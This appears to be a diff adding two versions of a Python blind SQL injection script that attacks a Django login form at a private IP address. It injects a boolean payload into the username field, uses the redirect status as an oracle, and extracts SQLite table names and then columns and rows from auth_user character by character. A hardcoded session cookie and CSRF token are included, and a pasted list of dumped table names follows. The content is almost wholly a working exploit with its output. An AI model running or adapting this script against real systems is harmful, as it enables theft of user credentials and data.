@@ -1,0 +1,381 @@
+import requests
+
+import time
+
+  
+
+URL = "http://192.168.125.80/userlogin"
+
+  
+
+COOKIES = {
+
+    "sessionid": "b29wm5om9g26s9ifn0o4v3n6t768vftd"
+
+}
+
+  
+
+BASE_DATA = {
+
+    "csrfmiddlewaretoken": "RO3rosxSLjlvKBdqI4YlnftJ39rcBApuZKLksKhYJmjy7s0nzHBtjCgPebwCtcfW",
+
+    "username": "",
+
+    "password": "x",
+
+    "captcha": "!2g8#0"
+
+}
+
+  
+
+SESSION = requests.Session()
+
+SESSION.headers.update({
+
+    "User-Agent": "Mozilla/5.0"
+
+})
+
+  
+
+# TRUE = 302, FALSE = 200
+
+def is_true(condition):
+
+    payload = f"' OR ({condition}) --"
+
+    data = BASE_DATA.copy()
+
+    data["username"] = payload
+
+  
+
+    for _ in range(3):  # retry up to 3 times
+
+        try:
+
+            r = SESSION.post(
+
+                URL,
+
+                data=data,
+
+                cookies=COOKIES,
+
+                allow_redirects=False,
+
+                timeout=5,
+
+                stream=True   # IMPORTANT: don't read body
+
+            )
+
+            r.close()        # close immediately
+
+            return r.status_code == 302
+
+        except requests.exceptions.RequestException:
+
+            time.sleep(1)
+
+  
+
+    return False
+
+  
+  
+
+def extract_string(query, max_len=40):
+
+    result = ""
+
+  
+
+    for pos in range(1, max_len + 1):
+
+        low, high = 32, 126  # printable ASCII
+
+        found = False
+
+  
+
+        while low <= high:
+
+            mid = (low + high) // 2
+
+            condition = f"UNICODE(SUBSTR(({query}),{pos},1))>{mid}"
+
+  
+
+            if is_true(condition):
+
+                low = mid + 1
+
+            else:
+
+                high = mid - 1
+
+  
+
+            time.sleep(0.05)  # SMALL delay = stability
+
+  
+
+        if 32 <= low <= 126:
+
+            result += chr(low)
+
+            print(f"    [+] {result}")
+
+            found = True
+
+  
+
+        if not found:
+
+            break
+
+  
+
+    return result
+
+  
+  
+
+def dump_tables(max_tables=20):
+
+    print("[*] Dumping SQLite table names...\n")
+
+  
+
+    for i in range(max_tables):
+
+        print(f"[*] Table {i}:")
+
+        table = extract_string(
+
+            f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}"
+
+        )
+
+  
+
+        if not table:
+
+            print("[*] No more tables.")
+
+            break
+
+  
+
+        print(f"[+] FOUND TABLE: {table}\n")
+
+  
+  
+
+if __name__ == "__main__":
+
+    dump_tables()
+
+import requests
+import time
+
+URL = "http://192.168.125.80/userlogin"
+
+COOKIES = {
+    "sessionid": "b29wm5om9g26s9ifn0o4v3n6t768vftd"
+}
+
+BASE_DATA = {
+    "csrfmiddlewaretoken": "RO3rosxSLjlvKBdqI4YlnftJ39rcBApuZKLksKhYJmjy7s0nzHBtjCgPebwCtcfW",
+    "username": "",
+    "password": "x",
+    "captcha": "!2g8#0"
+}
+
+SESSION = requests.Session()
+SESSION.headers.update({
+    "User-Agent": "Mozilla/5.0"
+})
+
+# -------------------------
+# Boolean Oracle
+# TRUE  = 302
+# FALSE = 200
+# -------------------------
+def is_true(condition):
+    payload = f"' OR ({condition}) --"
+    data = BASE_DATA.copy()
+    data["username"] = payload
+
+    for _ in range(3):
+        try:
+            r = SESSION.post(
+                URL,
+                data=data,
+                cookies=COOKIES,
+                allow_redirects=False,
+                timeout=5,
+                stream=True
+            )
+            r.close()
+            return r.status_code == 302
+        except requests.exceptions.RequestException:
+            time.sleep(1)
+
+    return False
+
+
+# -------------------------
+# Blind string extractor
+# -------------------------
+def extract_string(query, max_len=60):
+    result = ""
+    last_char = None
+
+    for pos in range(1, max_len + 1):
+        low, high = 32, 126
+
+        while low <= high:
+            mid = (low + high) // 2
+            condition = f"UNICODE(SUBSTR(({query}),{pos},1))>{mid}"
+
+            if is_true(condition):
+                low = mid + 1
+            else:
+                high = mid - 1
+
+            time.sleep(0.05)
+
+        # STOP if NULL / non-printable
+        if low < 32 or low > 126:
+            break
+
+        ch = chr(low)
+
+        # STOP on repeated trailing spaces
+        if ch == " " and last_char == " ":
+            break
+
+        result += ch
+        last_char = ch
+        print(f"    [+] {result}")
+
+    return result.rstrip()
+
+
+
+# -------------------------
+# Dump column names
+# -------------------------
+def dump_columns(table, max_cols=20):
+    print(f"\n[*] Dumping columns for table: {table}\n")
+    columns = []
+
+    for i in range(max_cols):
+        col = extract_string(
+            f"SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {i}",
+            max_len=40
+        )
+
+        if not col:
+            break
+
+        columns.append(col)
+        print(f"[+] COLUMN {i}: {col}")
+
+    return columns
+
+
+# -------------------------
+# Count rows
+# -------------------------
+def count_rows(table):
+    print(f"\n[*] Counting rows in {table}")
+    count = extract_string(f"SELECT COUNT(*) FROM {table}", max_len=6)
+    print(f"[+] TOTAL ROWS: {count}")
+    return int(count)
+
+
+# -------------------------
+# Dump rows
+# -------------------------
+def dump_rows(table, columns, start=0, max_rows=50):
+    print(f"\n[*] Dumping rows from {table}\n")
+
+    for row in range(start, start + max_rows):
+        print(f"[ROW {row}]")
+        empty = True
+
+        for col in columns:
+            value = extract_string(
+                f"SELECT {col} FROM {table} LIMIT 1 OFFSET {row}",
+                max_len=80
+            )
+
+            if value:
+                empty = False
+                print(f"  {col}: {value}")
+
+        if empty:
+            print("[*] No more rows.")
+            break
+
+        print("-" * 50)
+
+
+# -------------------------
+# MAIN
+# -------------------------
+if __name__ == "__main__":
+    TABLE = "auth_user"
+
+    columns = dump_columns(TABLE)
+    if not columns:
+        print("[-] No columns found.")
+        exit()
+
+    count_rows(TABLE)
+    dump_rows(TABLE, columns, start=0, max_rows=100)
+django_migrations
+sqlite_sequence
+auth_group
+auth_group_permissions
+auth_permission
+auth_user
+auth_user_groups
+auth_user_user_permissions
+django_admin_log
+django_content_type
+django_session
+
+home_category
+home_learnings
+home_prerequisite
+home_tag
+home_comment
+home_reply
+home_like
+home_skill
+home_jobsapplied
+home_workexp
+home_readhng
+home_userworkshop
+home_academic
+home_profile
+home_attendee
+home_blog
+home_job
+home_finding
+home_investigationrequest
+home_contact
+
+axes_accessattempt
+axes_accessfailurelog
+axes_accesslog
+
+Workshop
+
+
